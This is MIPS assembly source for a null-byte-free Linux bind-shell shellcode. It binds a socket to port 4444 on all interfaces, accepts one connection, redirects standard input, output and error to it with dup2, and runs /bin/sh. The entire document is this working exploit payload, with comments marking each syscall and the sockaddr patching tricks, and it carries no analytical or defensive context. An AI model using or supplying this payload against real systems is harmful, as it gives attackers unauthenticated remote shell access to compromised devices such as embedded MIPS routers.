.section .text
.globl __start
.set noreorder

__start:
      /* socket(2, 2, 0) */
      /* socket(AF_INET, SOCK_STREAM, IPPROTO_IP) */
      li $t6, -3
bind:
      nor $a1, $t6, $zero
      andi $a0, $a1, 0xffff
      slti $a2, $zero, -1
      li $v0, 4183
      syscall 0x40404
      li $t7, 0x7350 /* nop */
      /* save $v0 (return value) */
      andi $s1, $v0, 0xffff

      /* bind(sockfd, &sockaddr, 16) */
      andi $a0, $s1, 0xffff
      /* get current pc */
      li $t6, -0x7350
foo:  bltzal $t6, foo
      slti $t6, $zero, -1
bar:
      /* struct_addr is 196 bytes away from current pc */
      li $t6, -197
      nor $t6, $t6, $zero
      addu $a1, $ra, $t6
      /* patch struct_addr bytes move ptr past the struct_addr in order to refer to negative values and patch */ 
      addi $s3, $ra, 0x101
      sb $a2, -46($s3) 
      sb $a2, -61($s3) 
      sw $a2, -57($s3) 
      
      li $t6, -17   
      not $a2, $t6
      li $v0, 4169
      syscall 0x40404
      li $t7, 0x7350

      /* listen(sockfd, 2) */
      andi $a0, $s1, 0xffff
      li $t6, -3    
      not $a1, $t6
      li $v0, 4174
      syscall 0x40404
      li $t7, 0x7350

      /* accept(sockfd, 0, 0) */
      andi $a0, $s1, 0xffff
      slti $a1, $zero, -1
      slti $a2, $zero, -1
      li $v0, 4168
      syscall 0x40404
      li $t7, 0x7350
      andi $s1, $v0, 0xffff

      /* dup2(new_sockfd, 0) */
      andi $a0, $s1, 0xffff
      slti $a1, $zero, -1
      li $v1, 4063
      andi $v0, $v1, 0xffff
      syscall 0x40404
      li $t7, 0x7350

      /* dup2(new_sockfd, 1) */
      andi $a0, $s1, 0xffff
      slti $a1, $zero, 0x0101
      andi $v0, $v1, 0xffff
      syscall 0x40404
      li $t7, 0x7350

      /* dup2(new_sockfd, 2) */
      andi $a0, $s1, 0xffff
      li $t6, -3  
      not $a1, $t6
      andi $v0, $v1, 0xffff
      syscall 0x40404
      li $t7, 0x7350
 
      /* execve("/bin/sh", 0, 0) */
      /* get ptr to "/bin/sh" */
      addi $a0, $s3, -53
      slti $a1, $zero, -1
      slti $a2, $zero, -1
      li $v1, 4011
      andi $v0, $v1, 0xffff
      syscall 0x40404
      li $t7, 0x7350

struct_addr:
.ascii "\xFF\x02"
.ascii "\x11\x5c" /* port number 4444 */
.byte 1,1,1,1 /* ip address 0.0.0.0 */
shellcode:
.ascii "/bin/shX"
